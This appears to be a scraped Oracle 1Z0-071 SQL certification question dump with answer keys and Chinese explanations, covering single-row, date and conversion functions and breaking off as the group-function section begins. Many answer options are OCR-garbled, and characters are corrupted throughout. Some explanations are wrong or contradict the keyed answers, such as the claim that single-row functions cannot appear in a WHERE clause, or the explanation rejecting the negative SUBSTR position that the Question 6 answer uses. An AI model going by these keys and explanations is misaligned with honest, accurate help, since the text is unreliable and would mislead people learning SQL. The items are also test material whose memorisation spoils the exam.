多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The customers table has a CUST_CREDIT_LIMIT column of data type NUMBER. Which two queries execute successfully? A. SELECT TO_CHAR (NVL (CUST_CREDIT_LIMIT * .15, ‘NOT AVAILABLE’)) FROM CUSTOMERS; B. SELECT NVL2 (CUST_CREDIT_LIMIT * .15, ‘NOT AVAILABLE’) FROM CUSTOMERS C. SELECT NVL (CUST_CREDIT_LIMIT * .15, ‘NOT AVAILABLE’) FROM CUSTOMERS D. SELECT NVL (TO_CHAR (CUST_CREDIT_LIMIT * .15), ‘NOT AVAILABLE’) FROM CUSTOMERS E. SELECT NVL2 (CUST_CREDIT_LIMIT, TO_CHAR (CUST_CREDIT_LIMIT * .15), ‘NOT AVAILABLE’) FROM CUSTOMERS Correct Answer: DE Explanation/Reference: 考点：单行函数 nvl(c1,c2) 和 nvl2(c1,c2,c3) 函数的参数必须要求数据类型一致； NVL (CUST_CREDIT_LIMIT * .15, ‘NOT AVAILABLE’) 参数类型不一致，错误； NVL2 (CUST_CREDIT_LIMIT * .15, ‘NOT AVAILABLE’) 参数类型不一致，错误； QUESTION 2 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The customers table has a CUST_LAST_NAME column of data type varchar2 The table has two rows whose CUST_LAST_NAME values are Anderson and Ausson. Which query produces output for CUST_LAST_NAME containing Oder for the first row and Aus for the second? A. SELECT REPLACE (REPLACE (CUST_LAST_NAME,’son’,’’),’AN’,’O’) FROM CUSTOMERS B. SELECT REPLACE (TRIM (TRAILING ’son’ FROM CUST_LAST_NAME), ’AN’,’O’) FROM CUSTOMERS C. SELECT INITCAP (REPLACE (TRIM (‘SON’FROM CUST_LAST_NAME), ’AN’,’O’)) FROM CUSTOMERS D. SELECT REPLACE (SUBSTR (CUST_LAST_NAME, -3), ’AN’, ’O’)) FROM CUSTOMERS Correct Answer: A Explanation/Reference: 考点：单行函数字符串函数 Anderson and Ausson 转变为 Oder and Aus 观察后， An 替换为’O‘ son 替换为 ‘’ QUESTION 3 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The EMPLOYEES table contains columns EMP_ID of data type NUMBER and HIRE_DATE OF DATA TYPE DATE. You want to display the date of the first Monday after the completion of six months since hiring. The NLS_TERRITORY parameter is set to AMERICA in the session and, therefore, Sunday is the first day of the week. Which query can be used? A. SELECT EMP_ID, NEXT_DAY (ADD_MONTHS (HIRE_DATE, 6),’MONDAY’) FROM EMPLOYEES B. SELECT EMP_ID, ADD_MONTHS (HIRE_DATE, 6) NEXT_DAY (’MONDAY’) FROM EMPLOYEES C. SELECT EMP_ID, NEXT_DAY (MONTHS_BETWEEN (HIRE_DATE, SYSDATE), 6) FROM EMPLOYEES D. SELECT EMP_ID, NEXT_DAY（ADD_MONTHS (HIRE_DATE, 6), 1) FROM EMPLOYEES Correct Answer: A Explanation/Reference: 考点：单行函数日期函数题意求六个月后的第一个星期一，时区设定一个星期第一天是星期天。 Next_day 指定日期的下一天分析：A A 对指定 monday B 错格式错，不是内嵌函数 C 错 months_between 得出负数 D 错没有指定星期一 QUESTION 4 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements would execute successfully？ A. SELECT student name，subject1 FROM marks WHERE subject1 &gt; AvG（subject1）； B. SELECT student_name,SUM(subject1) FROM marks WHERE student_name LIKE &apos;R%&apos;; C. SELECT SUM(subject1+subject2+subject3) FROM marks WHERE student_name IS NULL; D. SELECT SUM(DISTINCT NVL(subject1,0)), MAX(subject1) FROM marks WHERE subject1 &gt; subject2; Correct Answer: CD Explanation/Reference: 考点：单行函数 A 错 where 条件中不能使用单行函数 B 错缺少 group by QUESTION 5 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Evaluate the following SQL statement: SELECT first_name, employee_id, NEXT_DAY(ADD_MONTHS(hire_date,6),1) &quot;Review&quot; FROM employees; The query was written to retrieve the FIRST_NAME, EMPLOYEE_ID, and review date for employees. The review date is the first Monday after the completion of six months of the hiring. The NLS_TERRITORY parameter is set to AMERICA in the session. Which statement is true regarding this query? A. The query would execute to give the desired output. B. The query would not execute because date functions cannot be nested, C. The query would execute but the output would give review dates that are Sundays. D. The query would not execute because the NEXT DAY function accepts a string as argument. Correct Answer: C Explanation/Reference: 考点：日期函数 题目的意思是显示某个时间以后第一个周一的日期，但是西方人的第一天是星期天 QUESTION 6 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You need to display the first names of all customers from the cUsTOMERs table that contain the character &apos;e&apos; and have the character &apos;a&apos; in the second last position Which query would give the required output? A. SELECT cust first name ROM customers WHERE INSTR (cust first name, &apos;e&apos;)&lt;&gt;0 AND fi SUBSTR (cust first name,-2, 1)=&apos;a&apos;; B. SELECT cust_first_name FROM customers WHERE INSTR (cust first name, &apos;e&apos;)&lt;&gt;&apos;AND SUBSTR (cust first name, -2, 1)=&apos;a&apos;; C. SELECT cust first name FROM customer: WHERE INSTR(cust first name, &apos;e&apos;)IS NOT NULL AND SUBSTR (cust first name, 1,-2)-&apos;a&apos;; D. SELECT cust_first_name FROM customers WHERE INSTR (cust first name, &apos;e&apos;)&lt;&gt;0 AND SUBSTR (cust first name, IENGTH (cust first name),-2)=&apos;a&apos;; Correct Answer: A Explanation/Reference: 考点：字符函数 SUBSTR(column or expression,m[,n]) 截取从索引位m的字符开始的数量为n个的字符，索引从1开始；n不能为负数从倒数第二位开始截取第一位 SCOTT@testdb&gt;select substr(&apos;abcde&apos;,-2,1) from dual; S -d 从昀后一位开始截取，-2 错误，不能为负数。因此错误 SCOTT@testdb&gt;select substr(&apos;abcde&apos;,length(&apos;abcde&apos;),-2) from dual; S - 正确的写法：从倒数第二位开始截取第一位 SCOTT@testdb&gt;select substr(&apos;abcde&apos;,length(&apos;abcde&apos;)-1,1) from dual; S -d QUESTION 7 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You plan to give a discount of 25% on the product price and need to display the discount amount in the same format as the PRoD PRICE. Which SOL statement would give the required result? A. SEIECT TO CHAR (prod price..25,&quot;s99,999.99y EROM PRICE LIST; B. SELECT TO-CHAR (TO NUMBER (prod price)..25, ,s99, 999.00.). FROM PRICE LIST: C. SELECT TO CHAR (TO NUMBER (prod price, &apos;$99,999.99.)..25,&apos;$99, 999.00.) FROM PRICE LIST; D. SELECT TO NUMBER (TONUMBER (prod price,&apos;$99,999.99)..25, ,$99, 995.00.) FROM PRICE LIST: Correct Answer: C Explanation/Reference: 考点：数据类型转换函数 TO_CHAR(number, &apos;format_model&apos;) 下面列出了一些格式元素,可以将其与 TO_CHAR 函数配合使用,以便将数字值显示为字符: 元素结果 9 代表一个数字 0 强制显示零 $ 放置一个浮动的美元符号 L使用浮动的本地货币符号 . 显示小数点 , 显示作为千位指示符的逗号 https://github.com/BoobooWei/booboo_oracle/blob/master/B-SQL%E8%AF%AD%E5%8F%A5-01-%E5%8D%95%E8%A1%8C%E5%87%BD%E6%95%B0.md QUESTION 8 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 What would be the result? A. It executes successfully but no rows updated. B. It gives an error because multiple NVL functions are used in an expression. C. It gives an error because Nvu function cannot be used with UPDATE D. It executes successfully and updates the records of those employees who have been working in the company for more than 600 days. Correct Answer: D Explanation/Reference: 考点：日期运算 sysdate-600：当前日期减去600天等于 600天之前的日期 QUESTION 9 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which statement is true regarding the above commands? A. Both execute successfully and give correct results. B. Only the first query executes successfully but gives a wrong result. C. Only the first query executes successfully and gives the correct result D. Only the second query executes successfully but gives a wrong result. E. Only the second query executes successfully and gives the correct result. Correct Answer: C Explanation/Reference: 考点：日期函数 题目要求 查出 po_id 和付款日期 如果 shipment_date 比 po_date 晚1个月 months_between(shipment_date,po_date) &gt; 1 select po_id, case when months_between(shipment_date,po_date) &gt; 1 then to_char(shipment_date - po_date) * 20 ) else &apos;No penalty&apos; END penalty from shipments; select po_id, decode(months_between(po_date, shipment_date) &gt; 1, to_char(shipment_date - po_date) * 20 ), &apos;No penalty&apos;) penalty from shipments; QUESTION 10 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You execute query： SELECT TO_CHAR(NEXT_DAY(LAST_DAY(SYSDATE), ’MON’,’dd”Monday for” fmMonth rrrr’)FROM DUAL; What is result? A. It executes successfully but does not return any result. B. It returns the date for the first Monday of the next month. C. It generates an error. D. It returns the date for the last Monday of the current month. Correct Answer: C Explanation/Reference: 考点：日期函数 NEXT_DAY指定日期之后的下一个日期 LAST_DAY当月昀后一天 QUESTION 11 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The STORES table has a column START_DATE of data type DATE,containing the date the row was inserted. You only want to display details of rows where START_DATE is within the last 25 months. Which WHERE clause can be used? A. WHERE TO_NUMBER(start_date - SYSDATE)&lt;=25 B. WHERE ADD_MONTHS (start_date , 25)&lt;= SYSDATE C. WHERE MONTHS_BETWEEN(SYSDATE,start_date)&lt;=25 D. WHERE MONTHS_BETWEEN(start_date,SYSDATE)&lt;=25 Correct Answer: C Explanation/Reference: 考点：日期函数 MONTHS_BETWEEN QUESTION 12 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which three statements are true about single-row functions? A. The data type returned can be different from the data type of the argument. B. They can be nested to any level. C. They return a single result row per table. D. They can accept only one argument. E. The argument can be a column name,variable,literal or an expression. F. They can be used only in the WHERE clause of a SELECT statement. Correct Answer: ABE Explanation/Reference: 分析：ABE A 对显式转换 B 对支持嵌套 C 错每一行返回一行，不是每个表返回一行 D 错单行函数的参数各不相同，例如 nvl2(),nvl() 参数一个为3一个为2 E 对参数可以是列名变量文字或表达式 F 错在列名使用也可以 QUESTION 13 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two queries execute successfully? A. SELECT NULLIF (100,100) FROM DUAL; B. SELECT NULLIF (100,&apos;A&apos;) FROM DUAL; C. SELECT COALESCE (100,&apos;A&apos;) FROM DUAL; D. SELECT COALESCE (100, NULL, 200) FROM DUAL; E. SELECT NULLIF (NULL, 100) FROM DUAL; Correct Answer: AD Explanation/Reference: 分析：AD Nullif 函数介绍：NULLIF (expr1, expr2)，若 expr1 和 expr2 相等，返回 NULL；不相等，等返回 expr1 COALESCE(EXPR1,EXPR2,EXPR3...EXPRn)从左往右数，遇到第一个非 null 值，则返回该非 null 值。多层判断第一点区别：从上面可以知道，nvl 只适合于两个参数的，COALESCE 适合于多个参数。第二点区别：COALESCE 里的所有参数类型必须保持一致。 QUESTION 14 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the EMPLOYEES table: NLS_DATE_FORMAT is set to DD-MON-YY. Which query requires explicit data type conversion? A. SELECT salary + &apos;120.50&apos; FROM employees; B. SELECT SUBSTR (join_date, 1, 2) - 10 FROM employees; C. SELECT join_date ll &apos; &apos; ll salary FROM employees; D. SELECT join_date FROM employees WHERE join_date &gt; &apos;10-02-2018&apos;; E. SELECT join_date + &apos;20&apos; FROM employees; Correct Answer: D Explanation/Reference: 分析求哪个选项需要显式转换 A 隐式字符转数字 B 隐式日期转字符 C 隐式日期转字符字符转数字 D 错误日期格式不一致，必须显示转换。 E 隐式 alter session set nls_date_format=&apos;DD-MON-YY&apos;; show parameter &quot;NLS_DATE&quot;; select sal+&apos;120.50&apos; from emp where rownum &lt; 2;# implicit隐式字符转数字 select substr(hiredate,1,2) - 10 from emp where rownum &lt; 2;# implicit隐式日期转字符 select hiredate || &apos;&apos; || sal from emp where rownum &lt; 2; # implicit隐式日期转字符字符转数字 select hiredate from emp where rownum &lt; 2 and hiredate &gt; &apos;10-02-2018&apos;; # 错误， &apos;10-02-2018&apos; 需要用to_date函数显式转换 select hiredate from emp where rownum &lt; 2 and hiredate &gt; to_date(&apos;10-02-2018&apos;,&apos;dd-mm-yyyy&apos;); select hiredate + &apos;20&apos; from emp where rownum &lt; 2; # implicit隐式字符转数字日期和数字加法的含义是：雇佣时间 + 20 天 =日期 QUESTION 15 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You create a table by using this command: CREATE TABLE rate_list (rate NUMBER (6, 2)); Which two are true about executing statements? A. INSERT INTO rate_list VALUES (-.9) inserts the value as -.9. B. INSERT INTO rate_list VALUES (0.999) produces an error. C. INSERT INTO rate_list VALUES (-10) produces an error. D. INSERT INTO rate_list VALUES (87654.556) inserts the value as 87654.6. E. INSERT INTO rate_list VALUES (0.551)inserts the value as .55. F. INSERT INTO rate list VALUES(-99.99)inserts the value as 99.99. Correct Answer: AE Explanation/Reference: 分析： Number(6,2) 昀多 6 个数位，昀多 2 个小数位从小数开始向左计算数位一共 6 个。昀大 9999.99 缺省小数.00 A对 -0.9 B 错 1 符合数位 C 错 -10 符合数位，规则不分正负 D 错报错超出有效数位 6 E 对 0.55 F 错 -99.99 负数 QUESTION 16 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about single row functions? A. CONCAT: can be used to combine any number of values B. MOD: returns the quotient of a division operation C. CEIL: can be used for positive and negative numbers D. FLOOR: returns the smallest integer greater than or equal to a specified number E. TRUNC: can be used with NUMBER and DATE values Correct Answer: CE Explanation/Reference: 分析：CE CONCAT只能两个参数，不是任意参数，错误 mod返回的是余数,，不是除法的熵，错误 floor(n)取小于等于数值 n 的昀大整数，错误 ceil(n) 取大于等于数值 n 的昀小整数；正确 trunc 函数处理数字、处理日期，正确 QUESTION 17 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 You need to calculate the number of days from 1st January 2019 until today. Dates are stored in the default format of DD-MON-RR. Which two queries give the required output? A. SELECT SYSDATE - TO_DATE (&apos;01-JANUARY-2019&apos;) FROM DUAL; B. SELECT TO_DATE (SYSDATE,&apos;DD/MONTH/YYYY&apos;) -&apos;01/JANUARY/2019&apos; FROM DUAL; C. SELECT ROUND (SYSDATE- TO_DATE (&apos;01/JANUARY/2019&apos;)) FROM DUAL; D. SELECT TO_CHAR (SYSDATE,&apos;DD-MON-YYYY&quot;) - &apos;01-JAN-2019&apos; FROM DUAL; E. SELECT ROUND (SYSDATE-&apos;01-JAN-2019&apos;) FROM DUAL; Correct Answer: AC Explanation/Reference: B 错格式不对 D 错格式不对 E 错格式不对 QUESTION 18 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the PRODUCT_INFORMATION table: NAME NULL? Type PROD_ID NOT NULL NUMBER (2) PROD_NAME VARCHAR2 (10) LIST_PRICE NUMBER (6, 2) Which query retrieves the number of products with a null list price? A. SELECT COUNT (list_price) FROM product_information WHERE list_price = NULL; B. SELECT COUNT (NVL (list_price, 0) ) FROM product_information WHERE list_price IS NULL; C. SELECT COUNT (DISTINCT list_price) FROM product_information WHERE list_price IS NULL; D. SELECT COUNT (list_price) FROM product_information WHERE list_price IS NULL; Correct Answer: B Explanation/Reference: 分析：B题意识检索空值的数量 A 错 =null 语法错，正确 is null B 对 nvl 是常用方法 C 错输出都是 0 D 错输出都是 0 QUESTION 19 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Which two statements are true about the COUNT function? A. It can only be used for NUMBER data types. B. COUNT (DISTINCT inv_amt) returns the number of rows excluding rows containing duplicates and NULLs in the INV_AMT column C. COUNT (*) returns the number of rows in a table including duplicate rows and rows containing NULLs in any column. D. A Select statement using the COUNT function with a DISTINCT keyword cannot have a WHERE clause. E. COUNT (inv_amt) returns the number of rows in a table including rows with NULL in the INV_AMT column. Correct Answer: BC Explanation/Reference: 分析：BC B 对 count（去重）不包含空值 C 对 count(*)包含空值 D 错 count 函数可以用 where QUESTION 20 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the data in the CUST_NAME column of the CUSTOMERS table: CUST NAME Renske Ladwig Jason Mallin Samuel McCain Allan MCEwen Ixene Mikkilineni Julia Nayer You want to display the CUST_NAME values where the last name starts with Mc or MC. Which two WHERE clauses give the required result? A. WHERE INITCAP (SUBSTR (cust_name, INSTR (cust_name, ‘‘) +1)) IN (‘MC%‘, ‘Mc %’) B. WHERE UPPER (SUBSTR (Cust name, INSTR (cust_name, ‘‘) +1)) LIKE UPPER(‘Mc%‘) C. WHERE INITCAP (SUBSTR (cust_name, INSTR (cust_name, ‘‘) +1)) LIKE ‘Mc%‘ D. WHERE SUBSTR (cust_name, INSTR (cust_name, ‘‘) +1) LIKE ‘Mc%‘OR ‘MC%‘ E. WHERE SUBSTR (cust_name, INSTR (cust_name, ‘‘) +1) LIKE ‘Mc%‘ Correct Answer: BC Explanation/Reference: SCOTT_NEW@testdb&gt;select &apos;Samuel McCain&apos; name from dual; NAME Samuel McCain SCOTT_NEW@testdb&gt;select instr(name,&apos; &apos;) from (select &apos;Samuel McCain&apos; name from dual) t1; INSTR(NAME,&apos;&apos;) 7 SCOTT_NEW@testdb&gt;select substr(name,instr(name,&apos; &apos;)) from (select &apos;Samuel McCain&apos; name from dual) t1; SUBSTR( McCain QUESTION 21 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The product_information table has a UNIT_PRICE column of data type NUMBER (8, 2) Evaluate this SQL statement: SELECT TO_CHAR (unit_price,&apos;$9,999&apos;) FROM product_information; Which two statements are true about the output? A. A row whose UNIT_PRICE column contains the value 1023.99 will be displayed as $1, 024. B. A row whose UNIT_PRICE column contains the value 1023.99 will be displayed as $1, 023. C. A row whose UNIT_PRICE column contains the value 10235.99 will be displayed as $1, 0236. D. A row whose UNIT_PRICE column contains the value 10235.99 will be displayed as $1, 023. E. A row whose UNIT_PRICE column contains the value 10235.99 will be displayed as ####### Correct Answer: AE Explanation/Reference: create table product_information (id int,UNIT_PRICE NUMBER (8, 2)); insert into product_information values (1, 1023.99); insert into product_information values (2, 10235.99); commit; SELECT TO_CHAR (unit_price,&apos;$9,999&apos;) FROM product_information; TO_CHAR(number, &apos;format_model&apos;) 下面列出了一些格式元素,可以将其与 TO_CHAR 函数配合使用,以便将数字值显示为字符: 元素结果 9 代表一个数字 0 强制显示零 $ 放置一个浮动的美元符号 L使用浮动的本地货币符号 . 显示小数点 , 显示作为千位指示符的逗号 -- 00和99的区别在整数会前置0补满指定位数 1. 四舍五入 2. 字符串的位数小于实际数字的整数位时，会显示为与数字个数相同的符号# QUESTION 22 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The INVOICE table has a QTY_SOLD column of data type NUMBER and an INVOICE_DATE column of data type DATE. NLS_DATE_FORMAT is set to DD-MON RR. Which two are true about data type conversions involving these columns in query expressions? A. Invoice_date &gt; &apos;01-02-2019&apos;: uses implicit conversion B. QTY_SOLD=&apos;0554982&apos;: requires explicit conversion C. CONCAT (QTY_SOLD, invoice_date): requires explicit conversion D. QTY_SOLD between &apos;101&apos; and &apos;110&apos;: uses implicit conversion E. invoice_date = &apos;15-march-2019&apos;: uses implicit conversion Correct Answer: DE Explanation/Reference: INVOICE表有一个NUMBER类型为NUMBER的QTY_SOLD列和一个 DATE 类型的 INVOICE_DATE NLS_DATE_FORMAT被设置为DD-MON RR。在查询表达式中涉及这些列的数据类型转换中，哪两个是正确的? A) Invoice_date &gt; &apos;01-02-2019&apos;:使用隐式转换错，不是日期格式需要显式转换 B) QTY_SOLD=&apos;0554982&apos;:需要显式转换错，数字一致，隐式 C) CONCAT (QTY_SOLD, invoice_date):需要显式转换错误 D) QTY_SOLD between &apos;101&apos;and &apos;110&apos;:使用隐式转换正确 E) Invoice_date = &apos;15-march-2019&apos;:使用隐式转换正确 conn / as sysdba alter session set nls_date_format = &apos;DD-MON RR&apos;; conn scott/tiger; create table INVOICE (QTY_SOLD NUMBER,INVOICE_DATE DATE); insert into INVOICE values (1,sysdate); insert into INVOICE values (2,sysdate); select * from invoice where invoice_date &gt; &apos;01-02-2019&apos;; select * from invoice where QTY_SOLD=&apos;0554982&apos;; select * from invoice where CONCAT(QTY_SOLD, invoice_date); select * from invoice where QTY_SOLD between &apos;101&apos; and &apos;110&apos;; select * from invoice where invoice_date = &apos;15-march-2019&apos;; invoice_date &gt; &apos;01-02-2019&apos;:使用隐式转换错，不是日期格式需要显式转换 QTY_SOLD=&apos;0554982&apos;:需要显式转换错，数字一致，隐式 CONCAT (QTY_SOLD, invoice_date):需要显式转换错误 QTY_SOLD between &apos;101&apos; and &apos;110&apos;:使用隐式转换正确 invoice_date = &apos;15-march-2019&apos; QUESTION 23 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine this query: SELECT TRUNC (ROUND (156.00,-2),-1) FROM DUAL What is the result? A. 16 B. 160 C. 150 D. 200 E. 100 Correct Answer: D Explanation/Reference: 分析：trunc 四舍 round 五入 round(156.00,-2) = 200 trunc(200,-1)=200 QUESTION 24 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 The ORDERS table has a column ORDER_DATE of data type DATE The default display format for a date is DD-MON-RR. Which two WHERE conditions demonstrate the correct usage of conversion functions? A. WHERE order_date &gt;To_CHAR (ADD_MONTHS (SYSDATE, 6)&apos;MON DD YYYY&apos;) B. WHERE To_CHAR (order_date, ‘MON DD YYYY&apos;) =&apos;JAN 20 2019&apos; C. WHERE order_date &gt; TO_date (&apos;JUL 10 2018&apos;, MON DD YYYY&apos;) D. WHERE order_date IN (TO_date (&apos;OCT 21 2018&apos;&apos;MON DD YYYY&apos;), To_CHAR (&apos;NOV 21 2018&apos;,&apos;MON DD YYYY&apos;)) E. WHERE order_date&gt;TO DATE(ADD_MONTHS(SYSDATE,6）,&apos;MON DD YYYY&apos;) Correct Answer: BC Explanation/Reference: 分析：BC A 错 ADD_MONTHS 是字符 D 错 IN（字符，数字） alter session set nls_date_format = &apos;DD-MON RR&apos;; create table orders (id int,order_date date); insert into orders values (1,sysdate); insert into orders values (2,sysdate); commit; select * from orders WHERE order_date &gt; to_char(ADD_MONTHS(SYSDATE, 6),&apos;MON DD YYYY&apos;); select * from orders WHERE to_char(order_date, &apos;MON DD YYYY&apos;) =&apos;JAN 20 2019&apos;; select * from orders WHERE order_date &gt; to_date(&apos;JUL 10 2018&apos;, &apos;MON DD YYYY&apos;); select * from orders WHERE order_date in (to_date(&apos;OCT 21 2018&apos;,&apos;MON DD YYYY&apos;), to_char(&apos;NOV 21 2018&apos;,&apos;MON DD YYYY&apos;)); select * from orders WHERE order_date&gt;TO_DATE(ADD_MONTHS(SYSDATE,6),&apos;MON DD YYYY&apos;); QUESTION 25 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 in the PROMOTIONS table, the PROMO_BEGEN_DATE column is of data type date and the default date format is DD-MON-RR (2 options) A. TO NUMBER (PROMO_BEGIN_DATE) -5 will return a number B. TO DATE (PROMO_BEGIN_DATE*5) Will return a date. C. PROMO_BEGIN_DATE- SYSDATE Will return a number. D. PROMO _BEGIN_DATE -5 will return a date. E. PROMO _BEGIN_DATE - sysdate will return an error Correct Answer: CD Explanation/Reference: alter session set nls_date_format = &apos;DD-MON-RR&apos;; create table PROMOTIONS (id NUMBER,PROMO_BEGIN_DATE DATE); insert into PROMOTIONS values (1,sysdate); insert into PROMOTIONS values (2,sysdate); commit; select TO_NUMBER(PROMO_BEGIN_DATE) - 5 from PROMOTIONS; select TO_DATE (PROMO_BEGIN_DATE * 5) from PROMOTIONS; select PROMO_BEGIN_DAEE - SYSDATE from PROMOTIONS; select PROMO_BEGIN_DATE -5 from PROMOTIONS; select PROMO_BEGIN_DATE - sysdate from PROMOTIONS; 考点： Oracle服务器可以自动转换下面的数据类型 number&lt;---&gt;varchar2|char&lt;----&gt;date 显式数据类型转换 num-----------------------------&gt;char----------------------------&gt;date to_char(num,&apos;$9.00&apos;) to_date(char,&apos;YYYY-MM-DD&apos;) num&lt;-----------------------------char&lt;-----------------------------date to_number(char,&apos;L99.00&apos;) to_char(date,&apos;YYYY-MM-DD&apos;) 日期不能直接转数字。 日期不能参加乘法运算。 日期和数字加减，代表加减天数，返回值为日期；日期与日期加减，返回值单位为天。 Exam C 组函数 QUESTION 1 跳转 Exam A 考点解析 Exam B 单行函数 Exam C 组函数 Exam D 多表连接 Exam E 子查询 Exam F SQLPlus和变量 Exam G DML语句的使用 Exam H DDL管理5大对象 Exam I DCL管理用户 Exam J DQL语句的使用 Exam K 事务和锁机制 1Z0-071考点和题目概览 Examine the description of the EMPLOYEES table: Which query is valid? A. SELECT dept_id, join_date, 